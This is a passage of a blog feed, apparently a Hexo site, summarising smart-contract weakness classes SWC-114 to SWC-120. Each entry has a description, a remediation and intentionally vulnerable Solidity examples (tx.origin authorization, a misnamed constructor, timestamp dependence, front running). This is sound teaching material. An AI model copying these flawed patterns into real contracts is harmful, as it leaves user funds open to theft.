        <content type="html"><![CDATA[<h1 id="SWC-120-Pseudo-Random-Number"><a href="#SWC-120-Pseudo-Random-Number" class="headerlink" title="SWC-120_Pseudo Random Number"></a>SWC-120_Pseudo Random Number</h1><p>Weak Sources of Randomness from Chain Attributes</p><ul><li><strong>Description</strong>: Ability to generate random numbers is very helpful in all kinds of applications. One obvious example is gambling DApps, where pseudo-random number generator is used to pick the winner. However, creating a strong enough source of randomness in Ethereum is very challenging. For example, use of <code>block.timestamp</code> is insecure, as a miner can choose to provide any timestamp within a few seconds and still get his block accepted by others. Use of <code>blockhash</code>, <code>block.difficulty</code> and other fields is also insecure, as they’re controlled by the miner. If the stakes are high, the miner can mine lots of blocks in a short time by renting hardware, pick the block that has required block hash for him to win, and drop all others.</li><li><strong>Remediation</strong>: <ul><li>Using <a href="https://en.wikipedia.org/wiki/Commitment_scheme">commitment scheme</a>, e.g. <a href="https://github.com/randao/randao">RANDAO</a>.</li><li>Using external sources of randomness via oracles, e.g. <a href="http://www.oraclize.it/">Oraclize</a>. Note that this approach requires trusting in oracle, thus it may be reasonable to use multiple oracles.</li><li>Using Bitcoin block hashes, as they are more expensive to mine.</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 09.SWC </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>19.SWC-119_Shadowing State Variables</title>
      <link href="/2023/07/13/09.SWC/19.SWC-119_Shadowing%20State%20Variables/"/>
      <url>/2023/07/13/09.SWC/19.SWC-119_Shadowing%20State%20Variables/</url>
      
        <content type="html"><![CDATA[<h1 id="SWC-119-Shadowing-State-Variables"><a href="#SWC-119-Shadowing-State-Variables" class="headerlink" title="SWC-119_Shadowing State Variables"></a>SWC-119_Shadowing State Variables</h1><p>Shadowing State Variables</p><ul><li><p><strong>Description</strong>: Solidity allows for ambiguous naming of state variables when inheritance is used. Contract <code>A</code> with a variable <code>x</code> could inherit contract <code>B</code> that also has a state variable <code>x</code> defined. This would result in two separate versions of <code>x</code>, one of them being accessed from contract <code>A</code> and the other one from contract <code>B</code>. In more complex contract systems this condition could go unnoticed and subsequently lead to security issues.</p><p>Shadowing state variables can also occur within a single contract when there are multiple definitions on the contract and function level.</p></li><li><p><strong>Remediation</strong>: Review storage variable layouts for your contract systems carefully and remove any ambiguities. Always check for compiler warnings as they can flag the issue within a single contract.</p></li></ul><p>vulnerability contract 1:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity 0.4.24;</span><br><span class="line"></span><br><span class="line">contract ShadowingInFunctions &#123;</span><br><span class="line">    uint n = 2;</span><br><span class="line">    uint x = 3;</span><br><span class="line"></span><br><span class="line">    function test1() constant returns (uint n) &#123;</span><br><span class="line">        return n; // Will return 0</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function test2() constant returns (uint n) &#123;</span><br><span class="line">        n = 1;</span><br><span class="line">        return n; // Will return 1</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function test3() constant returns (uint x) &#123;</span><br><span class="line">        uint n = 4;</span><br><span class="line">        return n+x; // Will return 4</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>vulnerability contract 2:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity 0.4.24;</span><br><span class="line"></span><br><span class="line">contract Tokensale &#123;</span><br><span class="line">    uint hardcap = 10000 ether;</span><br><span class="line"></span><br><span class="line">    function Tokensale() &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function fetchCap() public constant returns(uint) &#123;</span><br><span class="line">        return hardcap;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Presale is Tokensale &#123; // 这个问题在高版本的编译器中不存在，会直接报错</span><br><span class="line">    uint hardcap = 1000 ether;</span><br><span class="line"></span><br><span class="line">    function Presale() Tokensale() &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 09.SWC </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>18.SWC-118_Constructor Name</title>
      <link href="/2023/07/13/09.SWC/18.SWC-118_Constructor%20Name/"/>
      <url>/2023/07/13/09.SWC/18.SWC-118_Constructor%20Name/</url>
      
        <content type="html"><![CDATA[<h1 id="SWC-118-Constructor-Name"><a href="#SWC-118-Constructor-Name" class="headerlink" title="SWC-118_Constructor Name"></a>SWC-118_Constructor Name</h1><p>Incorrect Constructor Name</p><ul><li><p><strong>Description</strong>: Constructors are special functions that are called only once during the contract creation. They often perform critical, privileged actions such as setting the owner of the contract. Before Solidity version 0.4.22, the only way of defining a constructor was to create a function with the same name as the contract class containing it. A function meant to become a constructor becomes a normal, callable function if its name doesn’t exactly match the contract name. This behavior sometimes leads to security issues, in particular when smart contract code is re-used with a different name but the name of the constructor function is not changed accordingly.</p></li><li><p><strong>Remediation</strong>: Solidity version 0.4.22 introduces a new <code>constructor</code> keyword that make a constructor definitions clearer. It is therefore recommended to upgrade the contract to a recent version of the Solidity compiler and change to the new constructor declaration.</p></li></ul><p>vulnerability contract 1:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity 0.4.24;</span><br><span class="line"></span><br><span class="line">contract Missing&#123;</span><br><span class="line">    address private owner;</span><br><span class="line"></span><br><span class="line">    modifier onlyowner &#123;</span><br><span class="line">        require(msg.sender==owner);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function missing() // 改成constructor</span><br><span class="line">        public </span><br><span class="line">    &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function () payable &#123;&#125; </span><br><span class="line"></span><br><span class="line">    function withdraw() </span><br><span class="line">        public </span><br><span class="line">        onlyowner</span><br><span class="line">    &#123;</span><br><span class="line">       owner.transfer(this.balance);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>vulnerability contract 2:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity 0.4.24;</span><br><span class="line"></span><br><span class="line">contract Missing&#123;</span><br><span class="line">    address private owner;</span><br><span class="line"></span><br><span class="line">    modifier onlyowner &#123;</span><br><span class="line">        require(msg.sender==owner);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function Constructor() // 改成constructor</span><br><span class="line">        public </span><br><span class="line">    &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function () payable &#123;&#125; </span><br><span class="line"></span><br><span class="line">    function withdraw() </span><br><span class="line">        public </span><br><span class="line">        onlyowner</span><br><span class="line">    &#123;</span><br><span class="line">       owner.transfer(this.balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 09.SWC </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>16.SWC-116_Block values as a proxy for time</title>
      <link href="/2023/07/13/09.SWC/16.SWC-116_Block%20values%20as%20a%20proxy%20for%20time/"/>
      <url>/2023/07/13/09.SWC/16.SWC-116_Block%20values%20as%20a%20proxy%20for%20time/</url>
      
        <content type="html"><![CDATA[<h1 id="SWC-116-Block-values-as-a-proxy-for-time"><a href="#SWC-116-Block-values-as-a-proxy-for-time" class="headerlink" title="SWC-116_Block values as a proxy for time"></a>SWC-116_Block values as a proxy for time</h1><p>Block values as a proxy for time</p><ul><li><p><strong>Description</strong>: Contracts often need access to time values to perform certain types of functionality. Values such as <code>block.timestamp</code>, and <code>block.number</code> can give you a sense of the current time or a time delta, however, they are not safe to use for most purposes.</p><p>In the case of <code>block.timestamp</code>, developers often attempt to use it to trigger time-dependent events. As Ethereum is decentralized, nodes can synchronize time only to some degree. Moreover, malicious miners can alter the timestamp of their blocks, especially if they can gain advantages by doing so. However, miners can’t set a timestamp smaller than the previous one (otherwise the block will be rejected), nor can they set the timestamp too far ahead in the future. Taking all of the above into consideration, developers can’t rely on the preciseness of the provided timestamp.</p><p>As for <code>block.number</code>, considering the block time on Ethereum is generally about 14 seconds, it’s possible to predict the time delta between blocks. However, block times are not constant and are subject to change for a variety of reasons, e.g. fork reorganisations and the difficulty bomb. Due to variable block times, <code>block.number</code> should also not be relied on for precise calculations of time.</p></li><li><p><strong>Remediation</strong>: Developers should write smart contracts with the notion that block values are not precise, and the use of them can lead to unexpected effects. Alternatively, they may make use oracles.</p></li></ul><p>vulnerability contract 1: </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.5.0;</span><br><span class="line"></span><br><span class="line">contract TimeLock &#123;</span><br><span class="line">    struct User &#123;</span><br><span class="line">        uint amount; // amount locked (in eth)</span><br><span class="line">        uint unlockBlock; // minimum block to unlock eth</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; User) private users;</span><br><span class="line"></span><br><span class="line">    // Tokens should be locked for exact time specified</span><br><span class="line">    function lockEth(uint _time, uint _amount) public payable &#123;</span><br><span class="line">        require(msg.value == _amount, &#x27;must send exact amount&#x27;);</span><br><span class="line">        // Time lock contract using block number as proxy for time</span><br><span class="line">        users[msg.sender].unlockBlock = block.number + (_time / 14);</span><br><span class="line">        users[msg.sender].amount = _amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Withdraw tokens if lock period is over</span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        require(users[msg.sender].amount &gt; 0, &#x27;no amount locked&#x27;);</span><br><span class="line">        require(block.number &gt;= users[msg.sender].unlockBlock, &#x27;lock period not over&#x27;);</span><br><span class="line"></span><br><span class="line">        uint amount = users[msg.sender].amount;</span><br><span class="line">        users[msg.sender].amount = 0;</span><br><span class="line">        (bool success, ) = msg.sender.call.value(amount)(&quot;&quot;);</span><br><span class="line">        require(success, &#x27;transfer failed&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>vulnerability contract 2:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.5.0;</span><br><span class="line"></span><br><span class="line">contract TimedCrowdsale &#123;</span><br><span class="line"></span><br><span class="line">  event Finished();</span><br><span class="line">  event notFinished();</span><br><span class="line"></span><br><span class="line">  // Sale should finish exactly at January 1, 2019</span><br><span class="line">  function isSaleFinished() private returns (bool) &#123;</span><br><span class="line">  // Timestamp Dependence</span><br><span class="line">    return block.timestamp &gt;= 1546300800;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function run() public &#123;</span><br><span class="line">    if (isSaleFinished()) &#123;</span><br><span class="line">        emit Finished();</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        emit notFinished();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 09.SWC </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>15.SWC-115_tx.origin</title>
      <link href="/2023/07/13/09.SWC/15.SWC-115_tx.origin/"/>
      <url>/2023/07/13/09.SWC/15.SWC-115_tx.origin/</url>
      
        <content type="html"><![CDATA[<h1 id="SWC-115-tx-origin"><a href="#SWC-115-tx-origin" class="headerlink" title="SWC-115_tx.origin"></a>SWC-115_tx.origin</h1><p>Authorization through tx.origin</p><ul><li><p><strong>Description</strong>: <code>tx.origin</code> is a global variable in Solidity which returns the address of the account that sent the transaction. Using the variable for authorization could make a contract vulnerable if an authorized account calls into a malicious contract. A call could be made to the vulnerable contract that passes the authorization check since <code>tx.origin</code> returns the original sender of the transaction which in this case is the authorized account.</p></li><li><p><strong>Remediation</strong>: <code>tx.origin</code> should not be used for authorization. Use <code>msg.sender</code> instead.</p></li></ul><p>vulnerability contract: </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity 0.4.24;</span><br><span class="line"></span><br><span class="line">contract MyContract &#123;</span><br><span class="line"></span><br><span class="line">    address owner;</span><br><span class="line"></span><br><span class="line">    function MyContract() public &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function sendTo(address receiver, uint amount) public &#123;</span><br><span class="line">    // Use tx.origin to authorize ETH withdrawls</span><br><span class="line">    // fixed: require(msg.sender == owner);</span><br><span class="line">        require(tx.origin == owner); </span><br><span class="line">        receiver.transfer(amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 09.SWC </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>14.SWC-114_Front Running</title>
      <link href="/2023/07/13/09.SWC/14.SWC-114_Front%20Running/"/>
      <url>/2023/07/13/09.SWC/14.SWC-114_Front%20Running/</url>
      
        <content type="html"><![CDATA[<h1 id="SWC-114-Front-Running"><a href="#SWC-114-Front-Running" class="headerlink" title="SWC-114_Front Running"></a>SWC-114_Front Running</h1><p>Transaction Order Dependence</p><ul><li><p><strong>Description</strong>: The Ethereum network processes transactions in blocks with new blocks getting confirmed around every 17 seconds. The miners look at transactions they have received and select which transactions to include in a block, based who has paid a high enough gas price to be included. Additionally, when transactions are sent to the Ethereum network they are forwarded to each node for processing. Thus, a person who is running an Ethereum node can tell which transactions are going to occur before they are finalized.A race condition vulnerability occurs when code depends on the order of the transactions submitted to it.</p><p>The simplest example of a race condition is when a smart contract give a reward for submitting information. Say a contract will give out 1 token to the first person who solves a math problem. Alice solves the problem and submits the answer to the network with a standard gas price. Eve runs an Ethereum node and can see the answer to the math problem in the transaction that Alice submitted to the network. So Eve submits the answer to the network with a much higher gas price and thus it gets processed and committed before Alice’s transaction. Eve receives one token and Alice gets nothing, even though it was Alice who worked to solve the problem. A common way this occurs in practice is when a contract rewards people for calling out bad behavior in a protocol by giving a bad actor’s deposit to the person who proved they were misbehaving.</p><p>The race condition that happens the most on the network today is the race condition in the ERC20 token standard. The ERC20 token standard includes a function called ‘approve’ which allows an address to approve another address to spend tokens on their behalf. Assume that Alice has approved Eve to spend n of her tokens, then Alice decides to change Eve’s approval to m tokens. Alice submits a function call to approve with the value n for Eve. Eve runs a Ethereum node so knows that Alice is going to change her approval to m. Eve then submits a tranferFrom request sending n of Alice’s tokens to herself, but gives it a much higher gas price than Alice’s transaction. The transferFrom executes first so gives Eve n tokens and sets Eve’s approval to zero. Then Alice’s transaction executes and sets Eve’s approval to m. Eve then sends those m tokens to herself as well. Thus Eve gets n + m tokens even thought she should have gotten at most max(n,m).</p></li><li><p><strong>Remediation</strong>: A possible way to remedy for race conditions in submission of information in exchange for a reward is called a commit reveal hash scheme. Instead of submitting the answer the party who has the answer submits hash(salt, address, answer) [salt being some number of their choosing] the contract stores this hash and the sender’s address. To claim the reward the sender then submits a transaction with the salt, and answer. The contract hashes (salt, msg.sender, answer) and checks the hash produced against the stored hash, if the hash matches the contract releases the reward.</p><p>The best fix for the ERC20 race condition is to add a field to the inputs of approve which is the expected current value and to have approve revert if Eve’s current allowance is not what Alice indicated she was expecting. However this means that your contract no longer conforms to the ERC20 standard. If it important to your project to have the contract conform to ERC20, you can add a safe approve function. From the user perspective it is possible to mediate the ERC20 race condition by setting approvals to zero before changing them.</p></li></ul><p>vulnerability contract 1: </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.24;</span><br><span class="line"></span><br><span class="line">/** Taken from the OpenZeppelin github</span><br><span class="line"> * @title SafeMath</span><br><span class="line"> * @dev Math operations with safety checks that revert on error</span><br><span class="line"> */</span><br><span class="line">library SafeMath &#123;</span><br><span class="line"></span><br><span class="line">  /**</span><br><span class="line">  * @dev Multiplies two numbers, reverts on overflow.</span><br><span class="line">  */</span><br><span class="line">  function mul(uint256 a, uint256 b) internal pure returns (uint256) &#123;</span><br><span class="line">    // Gas optimization: this is cheaper than requiring &#x27;a&#x27; not being zero, but the</span><br><span class="line">    // benefit is lost if &#x27;b&#x27; is also tested.</span><br><span class="line">    // See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522</span><br><span class="line">    if (a == 0) &#123;</span><br><span class="line">      return 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    uint256 c = a * b;</span><br><span class="line">    require(c / a == b);</span><br><span class="line"></span><br><span class="line">    return c;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /**</span><br><span class="line">  * @dev Integer division of two numbers truncating the quotient, reverts on division by zero.</span><br><span class="line">  */</span><br><span class="line">  function div(uint256 a, uint256 b) internal pure returns (uint256) &#123;</span><br><span class="line">    require(b &gt; 0); // Solidity only automatically asserts when dividing by 0</span><br><span class="line">    uint256 c = a / b;</span><br><span class="line">    // assert(a == b * c + a % b); // There is no case in which this doesn&#x27;t hold</span><br><span class="line"></span><br><span class="line">    return c;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /**</span><br><span class="line">  * @dev Subtracts two numbers, reverts on overflow (i.e. if subtrahend is greater than minuend).</span><br><span class="line">  */</span><br><span class="line">  function sub(uint256 a, uint256 b) internal pure returns (uint256) &#123;</span><br><span class="line">    require(b &lt;= a);</span><br><span class="line">    uint256 c = a - b;</span><br><span class="line"></span><br><span class="line">    return c;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /**</span><br><span class="line">  * @dev Adds two numbers, reverts on overflow.</span><br><span class="line">  */</span><br><span class="line">  function add(uint256 a, uint256 b) internal pure returns (uint256) &#123;</span><br><span class="line">    uint256 c = a + b;</span><br><span class="line">    require(c &gt;= a);</span><br><span class="line"></span><br><span class="line">    return c;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /**</span><br><span class="line">  * @dev Divides two numbers and returns the remainder (unsigned integer modulo),</span><br><span class="line">  * reverts when dividing by zero.</span><br><span class="line">  */</span><br><span class="line">  function mod(uint256 a, uint256 b) internal pure returns (uint256) &#123;</span><br><span class="line">    require(b != 0);</span><br><span class="line">    return a % b;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract ERC20 &#123;</span><br><span class="line"></span><br><span class="line">  event Transfer( address indexed from, address indexed to, uint256 value );</span><br><span class="line">  event Approval( address indexed owner, address indexed spender, uint256 value);</span><br><span class="line">  using SafeMath for *;</span><br><span class="line"></span><br><span class="line">  mapping (address =&gt; uint256) private _balances;</span><br><span class="line"></span><br><span class="line">  mapping (address =&gt; mapping (address =&gt; uint256)) private _allowed;</span><br><span class="line"></span><br><span class="line">  uint256 private _totalSupply;</span><br><span class="line"></span><br><span class="line">  constructor(uint totalSupply)&#123;</span><br><span class="line">    _balances[msg.sender] = totalSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address owner) public view returns (uint256) &#123;</span><br><span class="line">    return _balances[owner];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  function allowance(address owner, address spender) public view returns (uint256)</span><br><span class="line">  &#123;</span><br><span class="line">    return _allowed[owner][spender];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function transfer(address to, uint256 value) public returns (bool) &#123;</span><br><span class="line">    require(value &lt;= _balances[msg.sender]);</span><br><span class="line">    require(to != address(0));</span><br><span class="line"></span><br><span class="line">    _balances[msg.sender] = _balances[msg.sender].sub(value);</span><br><span class="line">    _balances[to] = _balances[to].add(value);</span><br><span class="line">    emit Transfer(msg.sender, to, value);</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function approve(address spender, uint256 value) public returns (bool) &#123;</span><br><span class="line">    require(spender != address(0));</span><br><span class="line">    // fixed: add a valiable to limit the spender can only spend no more than</span><br><span class="line">    // the value set before. for example: yesterday i approve 100 token, and today</span><br><span class="line">    // i spend 50 token. he can&#x27;t spend more than 100 token in total.</span><br><span class="line">    _allowed[msg.sender][spender] = value;</span><br><span class="line">    emit Approval(msg.sender, spender, value);</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function transferFrom(address from, address to, uint256 value) public returns (bool) &#123;</span><br><span class="line">    require(value &lt;= _balances[from]);</span><br><span class="line">    require(value &lt;= _allowed[from][msg.sender]);</span><br><span class="line">    require(to != address(0));</span><br><span class="line"></span><br><span class="line">    _balances[from] = _balances[from].sub(value);</span><br><span class="line">    _balances[to] = _balances[to].add(value);</span><br><span class="line">    _allowed[from][msg.sender] = _allowed[from][msg.sender].sub(value);</span><br><span class="line">    emit Transfer(from, to, value);</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>vulnerability contract 2: </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> * @source: https://github.com/ConsenSys/evm-analyzer-benchmark-suite</span><br><span class="line"> * @author: Suhabe Bugrara</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.4.16;</span><br><span class="line"></span><br><span class="line">contract EthTxOrderDependenceMinimal &#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    bool public claimed;</span><br><span class="line">    uint public reward;</span><br><span class="line"></span><br><span class="line">    function EthTxOrderDependenceMinimal() public &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setReward() public payable &#123;</span><br><span class="line">        require (!claimed);</span><br><span class="line"></span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line">        owner.transfer(reward);</span><br><span class="line">        reward = msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function claimReward(uint256 submission) &#123;</span><br><span class="line">    // &#x27;Simple claim/set reward example for front running &#x27;</span><br><span class="line">        require (!claimed);</span><br><span class="line">        require(submission &lt; 10);</span><br><span class="line"></span><br><span class="line">        msg.sender.transfer(reward);</span><br><span class="line">        claimed = true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 09.SWC </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>13.SWC-113_DoS</title>
      <link href="/2023/07/13/09.SWC/13.SWC-113_DoS/"/>
